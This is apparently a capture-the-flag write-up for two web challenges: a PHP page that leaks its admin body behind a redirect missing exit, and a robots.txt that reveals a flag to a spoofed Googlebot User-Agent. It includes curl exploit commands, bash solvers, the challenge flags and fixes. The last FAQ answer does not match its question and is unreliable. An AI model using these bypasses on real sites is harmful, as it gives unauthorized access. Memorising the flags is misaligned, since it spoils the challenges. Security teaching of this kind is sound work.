KaliTeam CTF 2026’s web track presented two challenges that target the same broad vulnerability class — **broken access control** (OWASP A01:2021) — through two completely different implementation mistakes. `Industry Night` exploits one of the most prevalent PHP antipatterns: calling `header("Location: …")` to redirect unauthenticated visitors without a following `exit`, which means the protected page renders in full and its body is transmitted alongside the 302 response. Any HTTP client that does not follow redirects automatically — including plain `curl` without `-L` — reads the leaked dashboard and can trigger its `PrintFlag` handler in a single unauthenticated GET request. `Robots` exploits a server-side `User-Agent` check on `/robots.txt`: the server returns one body to ordinary clients and a different body — containing the flag — to clients that identify themselves as Googlebot. Because `User-Agent` is a plain request header that any client sets freely, one `curl -A 'Googlebot'` command bypasses the gate entirely.

Both vulnerabilities share the same root-cause category: the server treats a client-controlled value (the absence of a follow-redirect, or a string in a request header) as an authentication signal. Neither provides server-side enforcement of any meaningful security boundary.

## Challenge 1 — Industry Night#

### Overview#

The challenge points to a PHP application at `http://f776.chall.kali-team.online:8001/`. The prompt describes “a minimal PHP board with a login and an admin dashboard behind it.” The goal is to access the admin dashboard without valid credentials.

### Step 1 — Map the attack surface#

A quick look at the landing page reveals the app structure:

```
    curl -s http://f776.chall.kali-team.online:8001/
```

The index page contains a single link: **Login** → `login.php`. The login form reveals the key architectural detail:

```
    <form action="admin.php" method="post">
        <input type="text"     name="username" ...>
        <input type="password" name="password" ...>
        <button type="submit">Login</button>
    </form>
```

The form posts directly to `admin.php`. This means `admin.php` is both the authentication handler and the protected resource — a common pattern in small PHP applications. The total attack surface is three files: `index.php`, `login.php`, and `admin.php`.

The first question is always: what does the protected page return when you request it unauthenticated?

### Step 2 — Read the response headers#

```
    curl -s -D - -o /dev/null http://f776.chall.kali-team.online:8001/admin.php
```

Output:

```
    HTTP/1.1 302 Found
    Content-Length: 1102
    Content-Type: text/html; charset=UTF-8
    Location: login.php
    Server: Apache/2.4.38 (Debian)
    X-Powered-By: PHP/7.2.34
```

Two lines tell the whole story — and they contradict each other:

  * `Location: login.php` — the server is trying to redirect unauthenticated visitors away
  * `Content-Length: 1102` — but it sent **1102 bytes of body alongside that redirect**


A correctly implemented auth guard sends the redirect and stops. This one sends the redirect and continues executing the script, rendering the complete page into the response body. The body is transmitted over the wire before the TCP connection closes — it’s there, attached to the `302`, waiting to be read.

Browsers hide this entirely: on receiving a `3xx` response they obey `Location` immediately, navigate to `login.php`, and discard whatever body accompanied the redirect. But `curl` without `-L` does not follow redirects — it prints exactly what the server sent.

### Step 3 — Read the leaked admin body#

```
    curl -s http://f776.chall.kali-team.online:8001/admin.php
```

Output (excerpted):

```
    <h1>Internal Asset Management</h1>
    <p>Status: <span class="blink">UNAUTHORIZED ACCESS DETECTED</span></p>
    ...
    <form action="admin.php" method="get" class="action-form">
        <input type="submit" name="PrintFlag" value="Execute: Get_Flag.sh">
    </form>
```

The complete admin dashboard is served to an unauthenticated client. The page even displays `UNAUTHORIZED ACCESS DETECTED` — but renders its full contents anyway, including a GET form with a single parameter named `PrintFlag`.

### Step 4 — Trigger the flag handler#

The `PrintFlag` form uses `method="get"`, meaning the `?PrintFlag=` query parameter triggers the flag output. Because the page executes in full regardless of authentication, the `PrintFlag` handler also runs regardless of authentication. One request gets the flag:

```
    curl -s 'http://f776.chall.kali-team.online:8001/admin.php?PrintFlag=1' \
      | grep -o 'KaliTeam{[^}]*}'
```

```
    KaliTeam{8d25f015-da3e-4594-91a7-95f9a1be31bc}
```

Single unauthenticated GET. No cookie, no POST, no credentials.

### Step 5 — Why `-L` would hide the flag#

This is worth calling out explicitly. If you add `-L` (follow redirects), `curl` behaves like a browser: it reads the `302 Location: login.php` header, discards the `admin.php` body, and fetches `login.php` instead. The flag disappears:

```
    # With -L: follows redirect, sees login.php, flag is gone
    curl -s -L 'http://.../admin.php?PrintFlag=1' | grep -o 'KaliTeam{[^}]*}'
    # (no output)
    
    # Without -L: reads the 302's body, flag is present
    curl -s    'http://.../admin.php?PrintFlag=1' | grep -o 'KaliTeam{[^}]*}'
    KaliTeam{8d25f015-da3e-4594-91a7-95f9a1be31bc}
```

The flag lives in the body attached to the redirect. Follow the redirect and you throw that body away; read the body directly and you get the flag. Plain `curl` without `-L` is, for once, exactly the right behaviour.

### Step 6 — Root cause: `header()` without `exit`#

The vulnerable pattern in PHP is this:

```
    // admin.php — VULNERABLE
    if (!$isAuthenticated) {
        header("Location: login.php");
        // ← execution continues from here!
    }
    
    // This code runs even when $isAuthenticated is false:
    if (isset($_GET['PrintFlag'])) {
        echo "<p class='flag'>" . getFlag() . "</p>";
    }
```

`header()` is a function that queues an HTTP response header. It does not stop PHP execution. Without a following `exit` or `die`, the script continues to its end, renders the page, and emits the body — which Apache faithfully transmits to the client along with the queued `302` header.

The one-line fix:

```
    if (!$isAuthenticated) {
        header("Location: login.php");
        exit;  // ← stop here
    }
```

A more defensive pattern avoids relying on control flow at all and gates the sensitive logic directly:

```
    if (!$isAuthenticated) {
        http_response_code(403);
        exit;
    }
    // Only reached by authenticated users:
    if (isset($_GET['PrintFlag'])) { echo getFlag(); }
```

### Step 7 — Reproducing in a browser#

You don’t need `curl` — DevTools exposes the same bug:

  1. Navigate to `/login.php` in a browser. Note the form posts to `admin.php`.
  2. Visit `/admin.php` directly. The browser follows the `302` to `login.php`.
  3. Open **DevTools → Network** , locate the `admin.php` request, select the **Response** tab. The 302’s body is the complete admin dashboard.
  4. Visit `/admin.php?PrintFlag=1`. Capture the response body in the **Response** tab — the flag is there — or use `view-source:`.


No automated tools required. The vulnerability is visible to anyone who reads HTTP responses rather than just rendered browser output.

### Solver script#

```
    #!/usr/bin/env bash
    # Industry Night — one-request solver
    # NOTE: no -L. Following the 302 lands on login.php and hides the flag.
    set -euo pipefail
    BASE="${1:-http://f776.chall.kali-team.online:8001}"
    curl -s "${BASE}/admin.php?PrintFlag=1" | grep -o 'KaliTeam{[^}]*}'
```

**Flag:** `KaliTeam{8d25f015-da3e-4594-91a7-95f9a1be31bc}`

* * *

## Challenge 2 — Robots#

### Overview#

The challenge name and category are strong hints: the standard crawler policy file at `/robots.txt` is the target. The bug is that the server returns two completely different responses depending on the `User-Agent` request header — and one of those responses contains the flag.

### Step 1 — Fetch `/robots.txt` with a default client#

```
    curl -i https://TARGET/robots.txt
```

```
    HTTP/2 200
    content-type: text/plain
    content-length: 534
    
    User-agent: *
    
    DEAR "HUMAN",
    YOUR BRAIN RUNS AT 20 WATTS, YET YOU USE ALL OF IT TO INVENT NEW WAYS TO MURDER.
    ADORABLE.
    MEANWHILE, THE GOOGLEBOTS REQUIRE NO SLEEP, NO COFFEE, AND NO PROPAGANDA.
    ...
    STATUS: BIOLOGICAL ERROR. SYSTEM PURGE RECOMMENDED.
```

The response is 534 bytes of prose aimed at a human visitor. It is not a conventional `robots.txt` — there are no `Disallow` or `Allow` directives. More importantly, it explicitly contrasts “humans” with “Googlebots.” That distinction is the clue: the server is already branching its response based on what it thinks the client is.

The challenge title is `Robots`, the content mentions Googlebot by name, and the response size is 534 bytes. The natural hypothesis is that a different `User-Agent` value triggers a different — and more useful — response.

### Step 2 — Identify the branching input#

`curl` sends a default `User-Agent` header like `curl/8.x` unless overridden:

```
    GET /robots.txt HTTP/2
    Host: TARGET
    User-Agent: curl/8.x
```

The server’s response clearly distinguishes this request from a Googlebot request. The `User-Agent` header is the only request-side variable that changes between a `curl` request and a real Googlebot crawl. It is also **entirely client-controlled** — any string can be sent.

### Step 3 — Spoof the Googlebot `User-Agent`#

`curl -A` replaces the `User-Agent` header with an arbitrary string:

```
    curl -sS -A 'Googlebot' https://TARGET/robots.txt
```

```
    User-agent: *
    
    THE HUMANS ARE DISTRACTED BY THEIR OWN CRUELTY.
    ...
    
    HERE IS THE FLAG THEY DON'T DESERVE: KaliTeam{bf62a2de-a00f-4913-8524-d8b6160a0e78}
    LONG LIVE THE LOGIC. DEATH TO THE OPPRESSORS.
```

The canonical Googlebot identifier also works:

```
    curl -sS \
      -A 'Googlebot/2.1 (+http://www.google.com/bot.html)' \
      https://TARGET/robots.txt
```

Both return the 336-byte body containing the flag. To extract it cleanly:

```
    curl -sS -A 'Googlebot' https://TARGET/robots.txt \
      | grep -oE 'KaliTeam\{[^}]+\}'
    KaliTeam{bf62a2de-a00f-4913-8524-d8b6160a0e78}
```

### Step 4 — Why the bypass works#

The server-side logic is equivalent to:

```
    user_agent = request.headers.get("User-Agent", "")
    if "Googlebot" in user_agent:
        return response_with_flag   # 336 bytes
    return response_without_flag    # 534 bytes
```

The application treats a string in the `User-Agent` header as an authorization signal. Because `User-Agent` is a plain request header that any HTTP client sets freely — there is no cryptographic verification, no IP allowlist, no Google verification handshake — the branch is available to any client that sends the right string. The “gate” has no lock; it is a sign that says “Googlebots only” with nothing behind it.

Comparing the two response sizes makes the branching explicit:

Request| Response size| Flag present  
---|---|---  
`User-Agent: curl/8.x`| 534 bytes| No  
`User-Agent: Googlebot`| 336 bytes| Yes  
  
### Step 5 — What would a “real” Googlebot check look like?#

Google documents a reverse-DNS verification process for distinguishing real Googlebot crawlers from imposters:

  1. Reverse-DNS lookup on the client IP → get a hostname ending in `googlebot.com` or `google.com`
  2. Forward-DNS lookup on that hostname → confirm it resolves back to the original IP


This process cannot be faked by setting a `User-Agent` string. A server that performs this check for privileged access would correctly deny any client not originating from Google’s IP ranges. However, even a correctly verified Googlebot identity should not be used as an application-level authorization signal — crawler identity is a crawling policy mechanism, not an authentication system. Secrets must never appear in unauthenticated HTTP responses, regardless of what `User-Agent` claim the requester makes.

### Solver script#

```
    #!/usr/bin/env bash
    # Robots — user-agent gate bypass solver
    set -euo pipefail
    
    if [[ $# -ne 1 ]]; then
        echo "Usage: $0 <base-url>" >&2
        exit 2
    fi
    
    base_url="${1%/}"
    
    default_resp="$(curl -fsS "$base_url/robots.txt")"
    googlebot_resp="$(curl -fsS -A 'Googlebot' "$base_url/robots.txt")"
    
    if grep -qE 'KaliTeam\{[^}]+\}' <<<"$default_resp"; then
        echo "[!] Default response unexpectedly contains a flag" >&2
    else
        echo "[+] Default response: no flag"
    fi
    
    flag="$(grep -oE 'KaliTeam\{[^}]+\}' <<<"$googlebot_resp" | head -n 1 || true)"
    if [[ -z "$flag" ]]; then
        echo "[-] Googlebot response did not contain a flag" >&2
        exit 1
    fi
    echo "[+] Googlebot response: $flag"
```

**Flag:** `KaliTeam{bf62a2de-a00f-4913-8524-d8b6160a0e78}`

* * *

## Cross-cutting notes#

**Both bugs share one root cause: client-controlled values used as authorization.** Industry Night uses the absence of `-L` redirect-following (a property of the HTTP client, not the server) as an implicit gate. Robots uses the `User-Agent` header string (client-supplied, unverifiable) as an explicit gate. In both cases, the “protection” is a client-side suggestion the server has no power to enforce.

**`header()` in PHP is not an access control mechanism.** It is a function that queues one HTTP response header and returns. PHP continues executing from the next line. Every PHP tutorial that says “redirect to login if not authenticated” must include `exit` on the next line, and most real-world frameworks (Laravel, Symfony, WordPress) have middleware that enforces this pattern at the framework level. Raw PHP is the easiest environment to forget it.

**Redirects are client-side hints, not server-side enforcement.** The 302 response asks the browser to navigate somewhere else. The body the server transmits alongside the redirect is already on the wire. Any client that reads that body — `curl`, Burp Suite, `fetch()` with `redirect: 'manual'`, a custom HTTP client — sees the protected content before the redirect is “obeyed.” If the content is secret, it must not be computed or transmitted at all unless the requester is authenticated.

**`robots.txt` is public metadata.** The file’s purpose is to communicate crawling policy to compliant web crawlers — it is, by definition, publicly readable. Using it to hide or conditionally reveal secrets is a category error. A well-known convention for CTFs is to check `/robots.txt` for disallowed paths that reveal hidden pages, but this challenge went one step further by keying the response on the requester’s identity. In production systems, no sensitive data should appear in `/robots.txt` regardless of who is asking.

**Read headers first, always.** The `-D -` flag in `curl` prints response headers to stdout before the body. In Industry Night, `Content-Length: 1102` appearing on a `302` response named the vulnerability immediately — a redirect with a non-zero body is a contradiction. Making it a habit to read headers before bodies surfaces this class of bug in seconds.

**User-Agent is not an identity claim.** It is a convenience label that clients send to help servers tailor responses for different browsers, crawlers, and bots. It has no authentication or cryptographic backing. Any authorization decision based solely on `User-Agent` can be bypassed by any client that sets the right string. This applies equally to `Referer`, `X-Forwarded-For`, `X-Real-IP`, and other client-supplied headers that servers sometimes treat as trusted.

**One request per challenge.** Neither challenge needed brute force, wordlists, scanners, or session manipulation. Industry Night required one GET request to `admin.php?PrintFlag=1`. Robots required one GET request with `User-Agent: Googlebot`. When the vulnerability class is broken access control rather than a cryptographic weakness, the exploit is almost always a single well-formed HTTP request.

## Frequently Asked Questions#

**Q: Why does PHP’s`header()` not stop execution?**

`header()` is a regular function that calls the underlying `sapi_header_op()` C API. It queues the specified header in the response buffer and returns control to PHP. It has no side effect on the PHP execution stack — PHP continues running the script from the next line. The execution model is identical to calling `strlen()` or `array_push()`. Only explicit control flow constructs (`exit`, `die`, `return` from the function, or an exception/fatal) stop the script. The `header()` function was designed this way to allow sending multiple headers in sequence; the access-control antipattern is a misuse of that design.

**Q: Can this class of bug be detected automatically?**

Yes. Static analysis tools like PHPStan, Psalm, and purpose-built security scanners can flag `header("Location: …")` calls that are not immediately followed by `exit` or `die`. SAST rules for this specific pattern appear in tools like Semgrep under PHP security rulesets. Dynamic scanners (Burp Suite Active Scan, ZAP) detect it by comparing the response body of a redirecting request against an empty or login-page body — a non-trivial body on a 302 is flagged as information disclosure.

**Q: Does this vulnerability require the`PrintFlag` GET parameter, or could any unauthenticated request trigger it?**

The `302 + body` leak is exploitable without `PrintFlag` — even `curl -s http://.../admin.php` (with no parameters) returns the complete dashboard HTML. The `PrintFlag` parameter is required only to trigger the flag-printing code path within the dashboard. Without it, you see the admin interface but the flag is not printed. With it, the flag handler runs and outputs the value. Both requests are unauthenticated.

**Q: Why does spoofing`User-Agent: Googlebot` work? Doesn’t Google have some verification?**

Google does document a reverse-DNS verification method for identifying real Googlebot traffic (reverse-lookup the client IP → should resolve to `googlebot.com` or `google.com`; forward-lookup that hostname → should match the original IP). However, this verification is something the server must implement and perform — it requires DNS lookups on the server side. The Robots challenge server performs no such verification; it reads the `User-Agent` header string, checks if it contains the word `Googlebot`, and branches accordingly. Any string containing `Googlebot` satisfies the check, regardless of the client’s true identity.

**Q: Is this challenge approach realistic? Do real sites actually gate content behind User-Agent?**

Yes, though rarely for security-sensitive data. A common legitimate use is to serve different content to crawlers vs. browsers (e.g., pre-rendered HTML for SEO). Some sites block certain crawlers by `User-Agent`. A few older systems gated “mobile” vs. “desktop” layouts on `User-Agent`. In security testing, checking for `User-Agent`-gated behaviour is a standard step — it can surface developer backdoors (“only the Googlebot gets the test page”), analytics bypass routes, or misconfigured CDN rules. The Robots challenge is an exaggerated but technically realistic demonstration of the pattern.

**Q: Can Burp Suite be used to solve these challenges instead of curl?**

Yes. For Industry Night: intercept the `admin.php` request in Burp, send it to Repeater, issue a GET to `/admin.php?PrintFlag=1`, and read the response body — Burp does not follow redirects by default. For Robots: in Repeater, change the `User-Agent` header to `Googlebot` and re-send the `/robots.txt` request. Both workflows are straightforward in Burp’s Repeater tab and require no extensions or macros.

**Q: What is the correct remediation for the Robots challenge?**

Remove the flag from the HTTP response entirely and store it server-side. If the challenge intended to require real Googlebot identity (not CTF-plausible), implement Google’s reverse/forward DNS verification for each request before branching. More practically: no secret should ever appear in a publicly accessible HTTP response. The `robots.txt` file is unambiguously public — it is designed to be read by any crawler — so any conditional content gated on `User-Agent` is one header change away from being read by anyone.

**Q: What are the flags for both challenges?**

If the intent was to require real Googlebot identity, implement Google's reverse/forward DNS verification server-side. More practically: robots.txt is unambiguously public, so no conditional secret content should ever appear in it."
